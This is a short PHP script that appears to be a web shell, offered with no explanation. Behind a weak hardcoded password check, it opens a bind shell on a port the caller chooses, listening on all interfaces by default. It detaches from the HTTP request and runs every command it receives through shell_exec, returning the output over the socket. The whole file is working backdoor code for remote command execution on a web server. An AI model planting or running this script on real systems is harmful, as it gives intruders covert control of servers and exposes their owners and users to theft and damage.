<?php
set_time_limit(0);

$key = $_GET['auth'] ?? "";
if (
    md5($key) !==
    "5f4dcc3b5aa765d61d8327deb882cf99" // password
) {
    die("Access Denied");
}

$port = intval($_GET['port'] ?? 0);
$host = $_GET['host'] ?? "0.0.0.0"; // listens on all interfaces by default

if ($port > 65535 || $port < 1) {
    die("Syntax error!");
}

$addr = "{$host}:{$port}";
$server = stream_socket_server($addr, $errno, $errstr);

if (!$server) {
    die("[$errno] $errstr");
}

ignore_user_abort(true);

if (function_exists('fastcgi_finish_request')) {
    @fastcgi_finish_request();
} else {
    if (function_exists('apache_setenv')) {
         @apache_setenv('no-gzip', 1);
    }
    @ini_set('zlib.output_compression', 0);

    http_response_code(200);
    header("Content-Length: 0");
    header("Connection: close");

    while (ob_get_level() > 0) {
        ob_end_flush();
    }
    flush();
}

$client = @stream_socket_accept($server);

if (!$client) goto eof;

$ip = stream_socket_get_name($client, true);

stream_set_timeout($client, 300);

fwrite($client, "Established.\n> ");

while (true) {
    $input = fread($client, 2048); // 2KB
    
    $info = stream_get_meta_data($client);
    if ($info['timed_out']) {
        break;
    }
    if ($input === false || $input === '') {
        break;
    }

    $input = trim($input);

    if ($input === "gtfo") { // escape command
        break;
    }

    $output = shell_exec($input . " 2>&1");

    if ($output !== null || $output !== '') {
        fwrite($client, $output . "\n> ");
    }
}
eof:
@fclose($client);
@fclose($server);
?>
